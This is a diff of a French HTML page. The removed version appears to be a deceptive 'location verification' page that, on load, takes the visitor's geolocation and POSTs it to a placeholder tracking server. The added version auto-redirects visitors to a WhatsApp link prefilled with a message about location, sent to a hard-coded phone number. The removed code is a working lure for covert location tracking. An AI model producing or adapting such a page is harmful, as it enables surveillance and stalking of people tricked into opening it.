@@ -1,51 +1,30 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification de la localisation</title>
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-            } else {
-                alert("La géolocalisation n'est pas supportée par ce navigateur.");
-            }
-        }
-
-        function sendLocation(position) {
-            const data = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy
-            };
-
-            // Envoi des données à l'API backend (Node.js)
-            fetch('https://tonserveur.render.com/track', {  // Remplace par l'URL de ton application Render
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Données envoyées avec succès", data);
-            })
-            .catch(error => {
-                console.error("Erreur lors de l'envoi des données", error);
-            });
-        }
-
-        function handleError(error) {
-            alert("Erreur de géolocalisation : " + error.message);
-        }
-
-        // Demander la localisation quand la page est chargée
-        window.onload = function() {
-            getLocation();
-        };
-    </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Réponse automatique WhatsApp</title>
+  <script>
+    function envoyerMessageWhatsApp() {
+      // Message à envoyer
+      const message = "Bonjour, voici ma réponse automatique avec ma localisation !";
+      
+      // Numéro WhatsApp (sans le '+' et sans espaces)
+      const phone = "33605993097";  // +33 6 05 99 30 97 devient 33605993097
+      
+      // Construire l'URL pré-remplie pour WhatsApp
+      const url = "https://wa.me/" + phone + "?text=" + encodeURIComponent(message);
+      
+      // Rediriger l'utilisateur vers cette URL
+      window.location.href = url;
+    }
+    
+    // Dès que la page est chargée, on déclenche l'action
+    window.onload = envoyerMessageWhatsApp;
+  </script>
 </head>
 <body>
-    <h1>Vérification de l'accès à la localisation...</h1>
+  <h1>Redirection vers WhatsApp...</h1>
+  <p>Si la redirection ne s'effectue pas automatiquement, <a href="#" onclick="envoyerMessageWhatsApp()">clique ici</a>.</p>
 </body>
 </html>
